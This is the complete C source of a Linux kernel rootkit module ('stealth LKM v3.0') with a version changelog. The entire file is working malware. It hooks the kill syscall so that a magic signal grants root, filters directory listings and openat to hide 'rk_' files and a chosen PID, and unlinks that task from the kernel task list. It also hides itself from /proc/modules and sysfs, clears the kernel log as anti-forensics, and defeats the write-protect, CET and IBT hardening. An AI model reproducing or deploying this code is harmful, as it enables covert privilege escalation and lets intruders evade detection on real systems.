// rk.c - stealth LKM v3.0 (x86-64, IBT/CET aware)
//
// v2.0 -> v3.0 changes:
//   * silent by default: every log line is gated behind debug=1
//   * self-concealment covers both /proc/modules (list_del) and
//     /sys/module/<name> (kobject rename to .rk), restored before unload
//     so rmmod can still read holders/parameters/sections
//   * optional DKOM: unlink the hidden PID's task_struct from the global
//     task list (for_each_process consumers no longer see it)
//   * optional direct-path file hiding via an __x64_sys_openat hook
//   * optional kernel-log scrub (clears printk ring buffer at load)
//   * hook prologue validation hardened: saved=0f1f440000 is a complete
//     5-byte NOP, so saving/patching all 5 bytes does not split an insn
//
// Earlier history:
//   v1.7: hook __x64_sys_kill / __x64_sys_getdents64 directly (x64_sys_call
//         switch makes sys_call_table dead code on this kernel).
//   v1.8: unseal objtool-IBT-poisoned helpers, give trampolines ENDBR64.
//   v1.9: prepare_kernel_cred(&init_task); restore ftrace NOP after kprobe.
//   v2.0: dirent walk uses char* (d_reclen is a byte count).

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/errno.h>
#include <linux/limits.h>
#include <linux/vmalloc.h>
#include <linux/stop_machine.h>
#include <linux/cpumask.h>
#include <asm/processor.h>
#include <asm/special_insns.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("operator");
MODULE_DESCRIPTION("Stealth LKM v3: direct hooks, DKOM, self-hiding, silent mode");
MODULE_VERSION("3.0");

#define RK_SIGNAL      64
#define RK_UNHIDE_SIG  65
#define RK_HIDE_PREFIX "rk_"
#define ENDBR64_OPCODE 0xfa1e0ff3   /* f3 0f 1e fa, little-endian u32 */
#define ENDBR64_POISON 0xd6401f0f   /* gen_endbr_poison(): nopl -42(%rax) */
#define TRAMP_SIZE     PAGE_SIZE

static const u8 rk_endbr64[4] = { 0xf3, 0x0f, 0x1e, 0xfa };

typedef long (*syscall_fn)(const struct pt_regs *);
typedef unsigned long (*kln_fn)(const char *);
typedef int (*setmem_fn)(unsigned long, int);
typedef int (*stop_fn)(int (*)(void *), void *, const struct cpumask *);
typedef void (*void_fn)(void);

static syscall_fn orig_kill;
static syscall_fn orig_getdents64;
static syscall_fn orig_openat;
static struct task_struct *rk_init_task;
static kln_fn kln;
static setmem_fn rk_set_memory_x;
static setmem_fn rk_set_memory_rw;
static stop_fn rk_stop_machine;

/* ---- module parameters ------------------------------------------------ */
static int debug;
module_param(debug, int, 0644);
MODULE_PARM_DESC(debug, "Log diagnostics to dmesg (0 = silent, default)");

static int hide_pid;
module_param(hide_pid, int, 0644);
MODULE_PARM_DESC(hide_pid, "PID to hide from /proc listings (0 = none)");

static int hide_module;
module_param(hide_module, int, 0644);
MODULE_PARM_DESC(hide_module, "Hide from /proc/modules and /sys/module at load");

static int dkom_hide;
module_param(dkom_hide, int, 0644);
MODULE_PARM_DESC(dkom_hide, "Also unlink hide_pid from the kernel task list (DKOM)");

static int hide_open;
module_param(hide_open, int, 0644);
MODULE_PARM_DESC(hide_open, "Block open() of paths whose basename starts with rk_");

static int scrub_log;
module_param(scrub_log, int, 0644);
MODULE_PARM_DESC(scrub_log, "Clear the printk ring buffer at load (anti-forensics)");

/* ---- silent logging --------------------------------------------------- */
#define rk_log(fmt, ...) do { if (debug) pr_info("rk: " fmt, ##__VA_ARGS__); } while (0)
#define rk_warn(fmt, ...) do { if (debug) pr_warn("rk: " fmt, ##__VA_ARGS__); } while (0)

/* ---- module self-hiding state ---------------------------------------- */
static int module_hidden;
static struct list_head saved_link;
static char saved_kobj_name[MODULE_NAME_LEN];
static char pid_name[16];

/* ---- DKOM state ------------------------------------------------------- */
static struct task_struct *dkom_task;
static struct list_head dkom_saved;

/* rk_ibt_safe() rewrites the ftrace-tracked NOP at the kprobe point.  Keep the
 * original bytes so they can be restored once symbol lookup is finished;
 * otherwise the next load's register_kprobe() warns in ftrace_verify_code(). */
static void *rk_nop_patch_addr;
static u8 rk_nop_saved[8];
static size_t rk_nop_patch_len;

struct rk_hook {
	unsigned long addr;        /* original function entry */
	unsigned long patch_addr;  /* addr + ENDBR prefix */
	u8 saved[5];               /* original 5 bytes at patch_addr */
	void *trampoline;          /* executable pass-through stub */
};

static struct rk_hook kill_hook;
static struct rk_hook dent_hook;
static struct rk_hook open_hook;

static void rk_show_module(void);
static void rk_show_sysfs(void);
static void rk_dkom_restore(void);

static inline void rk_write_cr0(unsigned long v)
{
	asm volatile("mov %0, %%cr0" : : "r" (v) : "memory");
}

static inline unsigned long rk_read_cr4(void)
{
	unsigned long v;
	asm volatile("mov %%cr4, %0" : "=r" (v));
	return v;
}

static inline void rk_write_cr4(unsigned long v)
{
	asm volatile("mov %0, %%cr4" : : "r" (v) : "memory");
}

/*
 * CET forbids clearing CR0.WP while CR4.CET=1.  Drop CET first, clear WP,
 * write, then restore both with interrupts off.  Only used for short,
 * serialized patches (called from a stop_machine callback).
 */
static void rk_patch_begin(unsigned long *flags, unsigned long *cr4)
{
	local_irq_save(*flags);
	*cr4 = rk_read_cr4();
	rk_write_cr4(*cr4 & ~X86_CR4_CET);
	rk_write_cr0(read_cr0() & ~X86_CR0_WP);
}

static void rk_patch_end(unsigned long flags, unsigned long cr4)
{
	rk_write_cr0(read_cr0() | X86_CR0_WP);
	rk_write_cr4(cr4);
	local_irq_restore(flags);
}

static void rk_patch_mem(void *dst, const void *src, size_t len)
{
	unsigned long flags, cr4;
	rk_patch_begin(&flags, &cr4);
	memcpy(dst, src, len);
	rk_patch_end(flags, cr4);
}

/*
 * objtool "IBT seals" kernels compiled with CONFIG_X86_KERNEL_IBT: for every
 * function whose address is never taken by in-tree code it replaces the entry
 * ENDBR64 with the 4-byte poison NOP (0f 1f 40 d6).  Every helper we resolve
 * through kallsyms_lookup_name and then call through a function pointer is in
 * that category.  Restore a real ENDBR64 at the entry before the first call.
 */
static int rk_unseal(unsigned long addr, const char *name)
{
	u32 word = *(u32 *)addr;

	if (word == ENDBR64_OPCODE)
		return 0;
	if (word != ENDBR64_POISON) {
		rk_warn("unexpected entry at %px for %s (%08x), not unsealing\n",
			(void *)addr, name, word);
		return 0;
	}

	rk_patch_mem((void *)addr, rk_endbr64, sizeof(rk_endbr64));
	rk_log("unsealed %s at %px (poison -> ENDBR64)\n", name, (void *)addr);
	return 0;
}

struct rk_patch_args {
	void *dst;
	const void *src;
	size_t len;
};

static int rk_patch_cb(void *data)
{
	struct rk_patch_args *a = data;
	rk_patch_mem(a->dst, a->src, a->len);
	return 0;
}

/* Serialize the write so no CPU can execute a half-patched instruction. */
static void rk_patch_serial(void *dst, const void *src, size_t len)
{
	struct rk_patch_args a = { .dst = dst, .src = src, .len = len };
	rk_stop_machine(rk_patch_cb, &a, NULL);
}

/*
 * IBT landing-pad repair for the kprobe used to recover kallsyms_lookup_name.
 * Same logic as before: restore ENDBR64 at the real symbol entry (kprobe
 * leaves poison there) and make the probe point a legal landing pad.
 */
static unsigned long rk_ibt_safe(unsigned long addr)
{
	u8 *p = (u8 *)addr;
	u8 patch[8];
	unsigned long landing = 0;
	int i, nop_len;

	if (*(u32 *)(addr - 4) == ENDBR64_POISON) {
		rk_patch_mem((u8 *)(addr - 4), rk_endbr64, sizeof(rk_endbr64));
		rk_log("restored ENDBR64 at symbol entry %px (was kprobe poison)\n",
		       (void *)(addr - 4));
	}

	for (i = -16; i <= 16; i += 4) {
		if (*(u32 *)(addr + i) == ENDBR64_OPCODE) {
			landing = addr + i;
			break;
		}
	}

	if (p[0] == 0x0f && p[1] == 0x1f) {
		switch (p[2]) {
		case 0x00: nop_len = 3; break;
		case 0x40: nop_len = 4; break;
		case 0x44: nop_len = 5; break;
		case 0x84: nop_len = 8; break;
		default:   nop_len = 0; break;
		}
		if (nop_len >= 4) {
			rk_nop_patch_addr = p;
			rk_nop_patch_len = nop_len;
			memcpy(rk_nop_saved, p, nop_len);
			memset(patch, 0x90, sizeof(patch));
			memcpy(patch, rk_endbr64, sizeof(rk_endbr64));
			rk_patch_mem(p, patch, nop_len);
			rk_log("installed ENDBR64 landing pad at %px (was %d-byte NOP)\n",
			       (void *)addr, nop_len);
			if (!landing)
				landing = addr;
		}
	}

	return landing;
}

/* Put the ftrace NOP back.  All kallsyms lookups go through kln+0 (whose
 * ENDBR64 rk_ibt_safe restored), never through the patched kln+4 slot. */
static void rk_restore_nop(void)
{
	if (!rk_nop_patch_addr || !rk_nop_patch_len)
		return;
	rk_patch_mem(rk_nop_patch_addr, rk_nop_saved, rk_nop_patch_len);
	rk_nop_patch_addr = NULL;
	rk_nop_patch_len = 0;
}

static unsigned long rk_lookup(const char *name)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	unsigned long (*fn)(const char *);
	unsigned long addr, entry;

	if (register_kprobe(&kp) != 0) {
		rk_warn("register_kprobe failed\n");
		return 0;
	}

	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);

	entry = rk_ibt_safe(addr);
	if (!entry) {
		rk_warn("no usable ENDBR landing pad near %px\n", (void *)addr);
		return 0;
	}

	fn = (unsigned long (*)(const char *))entry;
	return fn(name);
}

/*
 * Pass-through stub.  ENDBR64 at the entry (the hook calls it through a
 * pointer), then movabs/push/ret to the first untouched instruction of the
 * original function.  The resume address is mid-function with no ENDBR64, so
 * an indirect jmp would raise #CP; IBT does not check ret.
 */
static void *rk_alloc_trampoline(unsigned long resume)
{
	u8 *t = vmalloc(TRAMP_SIZE);
	if (!t)
		return NULL;

	memset(t, 0x90, 32);
	memcpy(t, rk_endbr64, sizeof(rk_endbr64));

	t[5] = 0x48;
	t[6] = 0xb8;
	*(u64 *)(t + 7) = resume;
	t[15] = 0x50;
	t[16] = 0xc3;

	if (rk_set_memory_x((unsigned long)t, 1) != 0) {
		vfree(t);
		return NULL;
	}
	return t;
}

/*
 * A valid ftrace slot is one complete 5-byte instruction:
 *   e8 rel32                 call __fentry__
 *   0f 1f 44 00 00           nop dword ptr [rax+0x0]   (5-byte NOP)
 * An e9 rel32 is deliberately rejected: that would mean the slot is already
 * patched by another hook, and saving/restoring it would chain or resurrect
 * a stale jump.
 * The saved bytes printed as "saved=0f1f440000" are the whole 5-byte NOP.
 * We save and overwrite all 5 bytes, so no instruction is split; the
 * trampoline resumes at addr+prefix+5, the next real instruction boundary.
 */
static int rk_slot_valid(const u8 *p)
{
	if (p[0] == 0xe8)
		return 1;
	if (p[0] == 0x0f && p[1] == 0x1f && p[2] == 0x44 &&
	    p[3] == 0x00 && p[4] == 0x00)
		return 1;
	return 0;
}

static int rk_install_hook(struct rk_hook *h, unsigned long addr,
			   void *hook, syscall_fn *orig)
{
	u32 first = *(u32 *)addr;
	int prefix = (first == ENDBR64_OPCODE) ? 4 : 0;
	u8 *p = (u8 *)(addr + prefix);
	u8 jmp[5];
	long rel;
	void *tramp;

	if (!rk_slot_valid(p)) {
		rk_warn("unsupported prologue at %px: %02x %02x %02x %02x %02x\n",
			(void *)addr, p[0], p[1], p[2], p[3], p[4]);
		return -EINVAL;
	}

	tramp = rk_alloc_trampoline(addr + prefix + 5);
	if (!tramp) {
		rk_warn("cannot allocate trampoline for %px\n", (void *)addr);
		return -ENOMEM;
	}

	rel = (long)hook - (long)(addr + prefix + 5);
	if (rel > INT_MAX || rel < INT_MIN) {
		vfree(tramp);
		rk_warn("hook target out of range for %px\n", (void *)addr);
		return -ERANGE;
	}

	memcpy(h->saved, p, sizeof(h->saved));
	h->addr = addr;
	h->patch_addr = addr + prefix;
	h->trampoline = tramp;
	*orig = (syscall_fn)tramp;

	jmp[0] = 0xe9;
	*(s32 *)&jmp[1] = (s32)rel;
	rk_patch_serial((void *)h->patch_addr, jmp, sizeof(jmp));

	rk_log("hooked %px (prefix=%d) -> %px, tramp=%px saved=%02x%02x%02x%02x%02x\n",
	       (void *)addr, prefix, hook, tramp,
	       h->saved[0], h->saved[1], h->saved[2], h->saved[3], h->saved[4]);
	return 0;
}

static void rk_remove_hook(struct rk_hook *h)
{
	unsigned long addr = h->addr;

	if (!addr)
		return;

	rk_patch_serial((void *)h->patch_addr, h->saved, sizeof(h->saved));
	if (rk_set_memory_rw)
		rk_set_memory_rw((unsigned long)h->trampoline, 1);
	vfree(h->trampoline);
	h->addr = 0;
	h->trampoline = NULL;
	rk_log("restored %px\n", (void *)addr);
}

/* signal 64 -> root; signal 65 -> re-show module so rmmod can find it */
static long rk_kill(const struct pt_regs *regs)
{
	int sig = (int)regs->si;

	if (sig == RK_SIGNAL) {
		struct cred *new = prepare_kernel_cred(rk_init_task);
		if (new && commit_creds(new) == 0)
			rk_log("escalated pid %d (%s) to root\n",
			       current->pid, current->comm);
		else
			rk_warn("escalation failed for pid %d\n", current->pid);
		return 0;
	}
	if (sig == RK_UNHIDE_SIG) {
		rk_show_module();
		rk_show_sysfs();
		rk_dkom_restore();
		return 0;
	}
	return orig_kill(regs);
}

static int rk_should_hide(const char *name)
{
	if (strncmp(name, RK_HIDE_PREFIX, strlen(RK_HIDE_PREFIX)) == 0)
		return 1;
	if (hide_pid && strcmp(name, pid_name) == 0)
		return 1;
	return 0;
}

static long rk_getdents64(const struct pt_regs *regs)
{
	long ret = orig_getdents64(regs);
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	int offset = 0;
	int out_len;
	unsigned int reclen;

	if (ret <= 0)
		return ret;

	kdirent = kmalloc(ret, GFP_KERNEL);
	if (!kdirent)
		return ret;
	if (copy_from_user(kdirent, (void __user *)regs->si, ret)) {
		kfree(kdirent);
		return ret;
	}

	out_len = (int)ret;
	while (offset < out_len) {
		/* d_reclen/offset are byte counts, not element counts. */
		dir = (struct linux_dirent64 *)((char *)kdirent + offset);
		reclen = dir->d_reclen;
		if (reclen == 0 || (int)reclen > out_len - offset)
			break;

		if (rk_should_hide(dir->d_name)) {
			if (prev) {
				prev->d_reclen += reclen;
			} else {
				memmove(kdirent, (char *)kdirent + reclen,
					out_len - reclen);
				out_len -= reclen;
				continue;
			}
		} else {
			prev = dir;
		}
		offset += reclen;
	}

	ret = copy_to_user((void __user *)regs->si, kdirent, out_len)
		? -EFAULT : out_len;
	kfree(kdirent);
	return ret;
}

/* Direct-path denial: openat(path) with a rk_ basename returns -ENOENT. */
static long rk_openat(const struct pt_regs *regs)
{
	char buf[NAME_MAX + 1];
	const char __user *up = (const char __user *)regs->si;
	long n;
	char *base;

	n = strncpy_from_user(buf, up, sizeof(buf) - 1);
	if (n > 0) {
		buf[n] = '\0';
		base = strrchr(buf, '/');
		base = base ? base + 1 : buf;
		if (!strncmp(base, RK_HIDE_PREFIX, strlen(RK_HIDE_PREFIX)))
			return -ENOENT;
	}
	return orig_openat(regs);
}

/* ---- self-concealment ------------------------------------------------- */
static void rk_hide_module(void)
{
	if (module_hidden)
		return;
	saved_link.next = THIS_MODULE->list.next;
	saved_link.prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
	rk_log("removed from module list\n");
}

static void rk_show_module(void)
{
	if (!module_hidden)
		return;
	THIS_MODULE->list.next = saved_link.next;
	THIS_MODULE->list.prev = saved_link.prev;
	saved_link.next->prev = &THIS_MODULE->list;
	saved_link.prev->next = &THIS_MODULE->list;
	module_hidden = 0;
	rk_log("restored to module list\n");
}

/*
 * Rename the module kobject instead of kobject_del() + kobject_add().
 * kobject_del() tears down the whole subtree (holders/, parameters/,
 * sections/, notes/, uevent) and leaves mkobj.holders_dir pointing into a
 * removed tree.  kobject_add() only recreates an empty directory, so rmmod
 * can no longer read /sys/module/<name>/holders and refuses to unload.
 * kobject_rename() keeps every child alive under a dot-prefixed name; the
 * directory is hidden from ordinary listings but fully functional.
 */
static void rk_hide_sysfs(void)
{
	int ret;

	if (saved_kobj_name[0])
		return;
	strscpy(saved_kobj_name, THIS_MODULE->mkobj.kobj.name,
		sizeof(saved_kobj_name));
	ret = kobject_rename(&THIS_MODULE->mkobj.kobj, ".rk");
	if (ret) {
		saved_kobj_name[0] = '\0';
		rk_warn("kobject_rename to .rk failed (err=%d)\n", ret);
		return;
	}
	rk_log("renamed /sys/module/%s to .rk\n", saved_kobj_name);
}

static void rk_show_sysfs(void)
{
	char name[MODULE_NAME_LEN];
	int ret;

	if (!saved_kobj_name[0])
		return;
	strscpy(name, saved_kobj_name, sizeof(name));
	saved_kobj_name[0] = '\0';
	ret = kobject_rename(&THIS_MODULE->mkobj.kobj, name);
	if (ret)
		rk_warn("kobject_rename back to %s failed (err=%d)\n", name, ret);
	else
		rk_log("restored /sys/module/%s\n", name);
}

/* ---- DKOM: unlink hide_pid from the global task list ------------------ */
static void rk_dkom_hide(int pid)
{
	struct pid *p;
	struct task_struct *t;

	if (pid <= 0)
		return;

	rcu_read_lock();
	p = find_vpid(pid);
	t = p ? pid_task(p, PIDTYPE_PID) : NULL;
	if (t)
		get_task_struct(t);
	rcu_read_unlock();
	if (!t)
		return;

	dkom_saved.next = t->tasks.next;
	dkom_saved.prev = t->tasks.prev;
	list_del_rcu(&t->tasks);
	synchronize_rcu();
	dkom_task = t;
	rk_log("DKOM: unlinked pid %d from task list\n", pid);
}

static void rk_dkom_restore(void)
{
	struct task_struct *t = dkom_task;

	if (!t)
		return;
	t->tasks.next = dkom_saved.next;
	t->tasks.prev = dkom_saved.prev;
	rcu_assign_pointer(dkom_saved.next->prev, &t->tasks);
	rcu_assign_pointer(dkom_saved.prev->next, &t->tasks);
	synchronize_rcu();
	put_task_struct(t);
	dkom_task = NULL;
	rk_log("DKOM: restored task list link\n");
}

/* ---- anti-forensics: clear the printk ring buffer --------------------- */
static void rk_scrub_log(void)
{
	unsigned long b = kln("log_buf");
	unsigned long l = kln("log_buf_len");
	unsigned long cl = kln("console_lock");
	unsigned long cu = kln("console_unlock");
	char *buf;
	u32 len;
	void_fn lockfn, unlockfn;

	if (!b || !l || !cl || !cu)
		return;
	if (rk_unseal(cl, "console_lock") || rk_unseal(cu, "console_unlock"))
		return;

	buf = *(char **)b;
	len = *(u32 *)l;
	if (!buf || !len)
		return;

	lockfn = (void_fn)cl;
	unlockfn = (void_fn)cu;
	lockfn();
	memset(buf, 0, len);
	unlockfn();
	rk_log("scrubbed %u bytes of kernel log buffer\n", len);
}

/* ---- init / exit ------------------------------------------------------ */
static int __init rk_init(void)
{
	unsigned long kln_addr;
	unsigned long kill_addr, dent_addr, open_addr;
	int ret;

	kln_addr = rk_lookup("kallsyms_lookup_name");
	if (!kln_addr)
		return -ENOENT;
	kln = (kln_fn)kln_addr;
	rk_restore_nop();

	rk_set_memory_x  = (setmem_fn)kln("set_memory_x");
	rk_set_memory_rw = (setmem_fn)kln("set_memory_rw");
	rk_stop_machine  = (stop_fn)kln("stop_machine");
	if (!rk_set_memory_x || !rk_set_memory_rw || !rk_stop_machine)
		return -ENOENT;

	/* All three are reached through function pointers.  objtool seals their
	 * ENDBR64 entries on IBT kernels, so an indirect call faults with #CP
	 * until the poison NOP is replaced with a real landing pad. */
	if (rk_unseal((unsigned long)rk_set_memory_x, "set_memory_x") ||
	    rk_unseal((unsigned long)rk_set_memory_rw, "set_memory_rw") ||
	    rk_unseal((unsigned long)rk_stop_machine, "stop_machine"))
		return -EINVAL;

	kill_addr = kln("__x64_sys_kill");
	dent_addr = kln("__x64_sys_getdents64");
	if (!kill_addr || !dent_addr)
		return -ENOENT;

	/* Modern kernels reject NULL here; &init_task is the supported base. */
	rk_init_task = (struct task_struct *)kln("init_task");
	if (!rk_init_task)
		return -ENOENT;

	if (hide_pid > 0)
		snprintf(pid_name, sizeof(pid_name), "%d", hide_pid);

	ret = rk_install_hook(&kill_hook, kill_addr, rk_kill, &orig_kill);
	if (ret)
		return ret;

	ret = rk_install_hook(&dent_hook, dent_addr, rk_getdents64,
			      &orig_getdents64);
	if (ret)
		goto out_kill;

	if (hide_open) {
		open_addr = kln("__x64_sys_openat");
		if (!open_addr) {
			ret = -ENOENT;
			goto out_dent;
		}
		ret = rk_install_hook(&open_hook, open_addr, rk_openat,
				      &orig_openat);
		if (ret)
			goto out_dent;
	}

	if (hide_module) {
		rk_hide_module();
		rk_hide_sysfs();
	}
	if (dkom_hide && hide_pid > 0)
		rk_dkom_hide(hide_pid);
	if (scrub_log)
		rk_scrub_log();

	rk_log("loaded v3.0 | kill=%px getdents=%px open=%px | sig=%d/%d "
	       "hide_pid=%d dkom=%d open=%d module=%d\n",
	       (void *)kill_addr, (void *)dent_addr,
	       hide_open ? (void *)open_hook.addr : NULL,
	       RK_SIGNAL, RK_UNHIDE_SIG, hide_pid, dkom_hide,
	       hide_open, hide_module);
	return 0;

out_dent:
	rk_remove_hook(&dent_hook);
out_kill:
	rk_remove_hook(&kill_hook);
	return ret;
}

static void __exit rk_exit(void)
{
	rk_restore_nop();
	rk_show_module();
	rk_show_sysfs();
	rk_dkom_restore();
	rk_remove_hook(&open_hook);
	rk_remove_hook(&dent_hook);
	rk_remove_hook(&kill_hook);
	rk_log("hooks restored, unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);
